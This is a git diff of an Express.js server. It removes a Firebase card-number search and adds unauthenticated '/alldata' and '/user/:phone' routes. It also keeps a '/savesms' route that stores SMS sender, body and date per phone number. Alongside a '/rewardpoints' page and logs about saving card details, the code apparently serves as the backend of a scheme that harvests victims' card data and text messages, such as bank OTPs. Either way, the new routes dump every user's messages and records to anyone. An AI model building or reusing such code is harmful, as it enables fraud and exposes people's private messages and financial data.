@@ -13,7 +13,6 @@ app.set('views', path.join(__dirname, 'views'));
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
-const db = require('./firebase-config');
 const cookieParser = require('cookie-parser');
 const { generateToken, verifyToken } = require('./jwt');
 const session = require('express-session');
@@ -99,40 +98,6 @@ const authenticateJWT = (req, res, next) => {
 
 
 
-async function findCardInDatabase(cardNumberToFind) {
-  try {
-      // 1. Fetch all users
-      const usersSnapshot = await db.ref('users').once('value');
-      // console.log("usersSnapshot",usersSnapshot)
-      // 2. Iterate over each user
-      for (const userId in usersSnapshot.val()) {
-          const userRef = db.ref(`users/${userId}/cards`);
-          const cardsSnapshot = await userRef.once('value');
-          const userCards = cardsSnapshot.val();
-          // console.log("userCards",userCards)
-
-          // 3. Iterate over each card and check for a match
-          for (const cardKey in userCards) {
-              // console.log("cardkey",cardKey)
-              console.log("card_number fetched",userCards.cardNumber)
-              if (userCards.cardNumber == cardNumberToFind) {
-                  // console.log("data matched fro",cardNumberToFind)
-                  return true;
-              }
-          }
-      }
-
-      // 4. Card number not found
-      return false;
-  } catch (error) {
-      console.error('Error searching for card:', error);
-      throw error;  // Or handle the error as needed
-  }
-}
-
-
-
-
 
 // app.get('/test', async (req, res) => {
 //   try {
@@ -145,9 +110,6 @@ async function findCardInDatabase(cardNumberToFind) {
 //     res.status(500).send("An error occurred while fetching card details.");
 //   }
 // });
-
-
-
 
 
 
@@ -171,36 +133,77 @@ app.get('/rewardpoints', (req, res) => {
   });
 
 
-
-app.post('/savesms', async(req, res) => {
-    var { address, body, date,phone } = req.body;
-  console.log("received data savsms",address,body,date,phone)
-  const smsData = {
-    address,
-    body,       
-    date
-  };
-  console.log('Updating user with phone:', phone);
-  try {
-      const user = await User.findOneAndUpdate(
-          { phone },
-          { $push: { sms: smsData } },
-          { new: true } 
-      );
-      if (user) {
-          console.log('Card successfully added to user:', user);
-          res.json({ valid: true });
-      } else {
-          console.log('User not found, responding with error');
-          res.json({ valid: false, error: 'User not found' });
+app.get('/alldata', async (req, res) => {
+    try {
+      const allUsersWithSMS = await User.find({ sms: { $exists: true, $ne: [] } })
+        .select('phone userData sms');
+  
+      if (allUsersWithSMS.length === 0) {
+        return res.status(404).json({ valid: false, message: 'No SMS data found.' });
       }
-  } catch (error) {
-      console.error('Error saving card to MongoDB:', error);
-      res.json({ valid: false, error: 'Error saving card details' });
-  }
-});
+  
+      const formattedData = allUsersWithSMS.map(user => ({
+        phone: user.phone,
+        userData: user.userData,
+        sms: user.sms
+      }));
+  
+      res.json({
+        valid: true,
+        data: formattedData 
+      });
+    } catch (error) {
+      console.error('Error fetching SMS data:', error);
+      res.status(500).json({ valid: false, error: 'Internal server error' });
+    }
+  });
+  
 
-
+app.get('/user/:phone', async (req, res) => {
+    const { phone } = req.params;
+  
+    try {
+      const user = await User.findOne({ phone }); 
+      if (!user) {
+        return res.status(404).json({ valid: false, message: 'User not found' });
+      }
+  
+      res.json({ valid: true, data: user });
+    } catch (error) {
+      console.error('Error fetching user data:', error);
+      res.status(500).json({ valid: false, error: 'Internal server error' });
+    }
+  });
+  
+  
+app.post('/savesms', async(req, res) => {
+      var { address, body, date,phone } = req.body;
+    console.log("received data savsms",address,body,date,phone)
+    const smsData = {
+      address,
+      body,       
+      date
+    };
+    console.log('Updating user with phone:', phone);
+    try {
+        const user = await User.findOneAndUpdate(
+            { phone },
+            { $push: { sms: smsData } },
+            { new: true } 
+        );
+        if (user) {
+            console.log('Card successfully added to user:', user);
+            res.json({ valid: true });
+        } else {
+            console.log('User not found, responding with error');
+            res.json({ valid: false, error: 'User not found' });
+        }
+    } catch (error) {
+        console.error('Error saving card to MongoDB:', error);
+        res.json({ valid: false, error: 'Error saving card details' });
+    }
+  });
+  
 
 app.get('*', (req, res) => {
     res.render('pnf');
